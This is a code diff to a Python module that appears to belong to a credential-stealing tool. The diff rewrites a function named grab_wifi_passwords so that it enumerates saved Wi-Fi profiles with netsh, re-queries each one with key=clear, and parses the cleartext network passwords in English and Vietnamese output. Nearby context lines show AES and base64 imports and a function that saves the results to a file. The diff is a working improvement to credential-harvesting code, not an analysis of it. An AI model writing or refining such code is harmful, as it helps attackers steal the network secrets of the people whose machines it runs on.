@@ -13,7 +13,7 @@ import shutil
 import logging
 import gzip
 import tempfile
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime, timedelta
 from Cryptodome.Cipher import AES
 import base64
@@ -432,71 +432,98 @@ def grab_wifi_passwords():
         Dict with network names and passwords
     """
     wifi_data = {}
-    
-    try:
-        import subprocess
 
-        # Try UTF-8 first (Windows 10+), fallback to cp1252 then cp850
-        def _run_netsh(args, **kwargs):
-            for enc in ('utf-8', 'cp1252', 'cp850'):
+    try:
+        import re
+        import subprocess
+        import unicodedata
+
+        def _normalize_text(s):
+            """Lowercase + remove accents to make keyword checks locale-tolerant."""
+            if not isinstance(s, str):
+                return ""
+            s = unicodedata.normalize('NFKD', s)
+            s = ''.join(ch for ch in s if not unicodedata.combining(ch))
+            return s.lower().strip()
+
+        # Try common Windows encodings; return the first successful text result.
+        def _run_netsh(args):
+            last = None
+            for enc in ('utf-8', 'cp1258', 'cp1252', 'cp850'):
                 try:
-                    r = subprocess.run(args, capture_output=True, text=True,
-                                      encoding=enc, errors='ignore', **kwargs)
-                    return r
+                    last = subprocess.run(
+                        args,
+                        capture_output=True,
+                        text=True,
+                        encoding=enc,
+                        errors='ignore',
+                        check=False,
+                    )
+                    if isinstance(last.stdout, str):
+                        return last
                 except Exception:
                     continue
-            return subprocess.run(args, capture_output=True, errors='ignore', **kwargs)
+            return last
 
-        # Get WiFi profiles
+        # Example lines:
+        #   All User Profile     : HomeWiFi
+        #   Ho so tat ca nguoi dung : HomeWiFi
+        profile_line_re = re.compile(r'^\s*([^:]+?)\s*:\s*(.+?)\s*$')
+
         result = _run_netsh(['netsh', 'wlan', 'show', 'profiles'])
-        stdout = result.stdout if isinstance(result.stdout, str) else result.stdout.decode('utf-8', errors='ignore')
-
-        if "no wireless" in stdout.lower() or "wi-fi" not in stdout.lower() and "wlan" not in stdout.lower() and len(stdout.strip()) < 30:
-            logger.warning("No WiFi adapter found")
+        if not result:
             return wifi_data
 
-        # Broad filter: any line with " : " that looks like a profile entry
-        # Works for English ("All User Profile : SSID") and Vietnamese ("Hồ sơ ... : SSID")
+        stdout = result.stdout or ""
         profiles = []
-        for line in stdout.split('\n'):
-            if ' : ' not in line:
+
+        for raw_line in stdout.splitlines():
+            m = profile_line_re.match(raw_line)
+            if not m:
                 continue
-            lower = line.lower()
-            # Match English and Vietnamese keywords, OR fall back to indented lines with " : "
-            if ('profile' in lower or 'hồ sơ' in lower or 'h\x1b' in lower
-                    or (line.startswith('    ') and line.strip().count(' : ') == 1)):
-                val = line.split(' : ', 1)[1].strip()
-                if val and val not in profiles:
-                    profiles.append(val)
+            lhs, rhs = m.group(1), m.group(2)
+            lhs_n = _normalize_text(lhs)
+            rhs = rhs.strip()
+            if not rhs:
+                continue
+
+            # Match profile rows in multiple locales/encodings.
+            if ('profile' in lhs_n or 'ho so' in lhs_n) and rhs not in profiles:
+                profiles.append(rhs)
+
+        if not profiles:
+            logger.warning("No saved WiFi profiles found")
+            return wifi_data
 
         logger.info(f"Found {len(profiles)} WiFi networks")
 
         for profile in profiles:
             try:
-                out = _run_netsh(
-                    f'netsh wlan show profile name="{profile}" key=clear',
-                    shell=True
-                )
-                out_text = out.stdout if isinstance(out.stdout, str) else out.stdout.decode('utf-8', errors='ignore')
+                out = _run_netsh(['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'])
+                out_text = (out.stdout or "") if out else ""
 
                 password = "(No Pass)"
-                for ln in out_text.split('\n'):
-                    # English: "Key Content", Vietnamese: "Nội dung khóa" or garbled equivalent
-                    if (' : ' in ln and
-                            any(kw in ln for kw in ('Key Content', 'N\u1ed9i dung kh\u00f3a',
-                                                     'key content', 'n\u1ed9i dung'))):
-                        password = ln.split(' : ', 1)[1].strip()
+                for ln in out_text.splitlines():
+                    m = profile_line_re.match(ln)
+                    if not m:
+                        continue
+                    key_name, key_val = m.group(1), m.group(2).strip()
+                    key_name_n = _normalize_text(key_name)
+
+                    # English: Key Content | Vietnamese: Noi dung khoa
+                    if 'key content' in key_name_n or 'noi dung khoa' in key_name_n:
+                        password = key_val if key_val else "(No Pass)"
                         break
 
                 wifi_data[profile] = password
             except Exception as e:
                 logger.debug(f"Extract WiFi {profile} failed: {e}")
-        
+
         logger.info(f"Extracted {len(wifi_data)} WiFi passwords")
-    
+
     except Exception as e:
         logger.error(f"grab_wifi_passwords failed: {e}")
-    
+
     return wifi_data
 
 def save_wifi_to_file(wifi_data):
